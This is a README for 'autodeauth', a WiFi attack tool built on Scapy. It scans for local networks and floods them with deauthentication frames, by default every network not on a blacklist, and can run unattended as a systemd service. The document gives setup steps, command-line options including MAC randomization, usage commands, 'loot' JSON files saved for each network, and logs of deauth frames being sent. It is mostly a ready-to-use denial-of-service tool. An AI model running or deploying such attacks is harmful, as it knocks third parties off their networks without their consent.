# autodeauth
A tool built to automatically deauth local networks
* Tested on Raspberry Pi OS and Kali Linux

# To-Do
* EAPOL packet Capture
* Auto join open networks and grab public ip

# Setup
```
$ chmod +x setup.sh
$ sudo ./setup.sh

[*] This can be changed by editing /etc/systemd/system/autodeauth.service
[?] Enter your WiFi interface to use with the autodeauth service: wlan0 


[*] Installed!, you can use sudo autodeauth -h to see available options.
[*] Use sudo systemctl start autodeauth to start the service
[*] Check the README for more infomation about configuring the service
```


# Options
```
$ sudo autodeauth -h
        _       _       ___                _   _    
       /_\ _  _| |_ ___|   \ ___ __ _ _  _| |_| |_  
      / _ \ || |  _/ _ \ |) / -_) _` | || |  _| ' \ 
     /_/ \_\_,_|\__\___/___/\___\__,_|\_,_|\__|_||_|

usage: autodeauth [-h] --interface INTERFACE [--blacklist BLACKLIST] [--whitelist WHITELIST] [--led LED] [--time TIME] [--random] [--ignore] [--count COUNT] [--verbose VERBOSE]

Auto Deauth Tool

options:
  -h, --help            show this help message and exit
  --interface INTERFACE, -i INTERFACE
                        Interface to fetch WiFi networks and send deauth packets (must support packet injection)
  --blacklist BLACKLIST, -b BLACKLIST
                        List of networks ssids/mac addresses to avoid (Comma seperated)
  --whitelist WHITELIST, -w WHITELIST
                        List of networks ssids/mac addresses to target (Comma seperated)
  --led LED, -l LED     Led pin number for led display
  --time TIME, -t TIME  Time (in s) between two deauth packets (default 0)
  --random, -r          Randomize your MAC address before deauthing each network
  --ignore              Ignore errors encountered when randomizing your MAC address
  --count COUNT, -c COUNT
                        Number of packets to send (default 5000)
  --verbose VERBOSE, -v VERBOSE
                        Scapy verbosity setting (default: 0)
                                                    
```

# Usage
After running the setup you are able to run the script by using autodeauth from any directory
## Command line
Networks with spaces can be represented using their mac addresses
```
$ sudo autodeauth -i wlan0 --blacklist FreeWiFi,E1:DB:12:2F:C1:57 -c 10000
```
## Service
```
$ sudo systemctl start autodeauth
```


# Loot and Log files
## Loot
When a network is detected and fits under the whitelist/blacklist criteria its network information is saved as a json file in /var/log/autodeauth/

```json
{
    "ssid": "MyWiFiNetwork",
    "mac_address": "10:0B:21:2E:C1:11",
    "channel": 1,
    "network.frequency": "2.412 GHz",
    "mode": "Master",
    "bitrates": [
        "6 Mb/s",
        "9 Mb/s",
        "12 Mb/s",
        "18 Mb/s",
        "24 Mb/s",
        "36 Mb/s",
        "48 Mb/s",
        "54 Mb/s"
    ],
    "encryption_type": "wpa2",
    "encrypted": true,
    "quality": "70/70",
    "signal": -35
} 
```
## Log File
```
$ cat /var/log/autodeauth/log               
2022-08-20 21:01:31 - Scanning for local networks
2022-08-20 21:20:29 - Sending 5000 deauth frames to network: A0:63:91:D5:B8:76 -- MyWiFiNetwork
2022-08-20 21:21:00 - Exiting/Cleaning up
```

# Edit Service Config

To change the settings of the autodeauth service edit the file /etc/systemd/system/autodeauth.service <br>
Lets say you wanted the following config to be setup as a service
```
$ sudo autodeauth -i wlan0 --blacklist FreeWiFi,myWifi -c 10000
```
```
$ vim /etc/systemd/system/autodeauth.service
```
Then you would change the ExecStart line to <br>
```
ExecStart=/usr/bin/python3 /usr/local/bin/autodeauth -i wlan0 --blacklist FreeWiFi,myWifi -c 10000
```

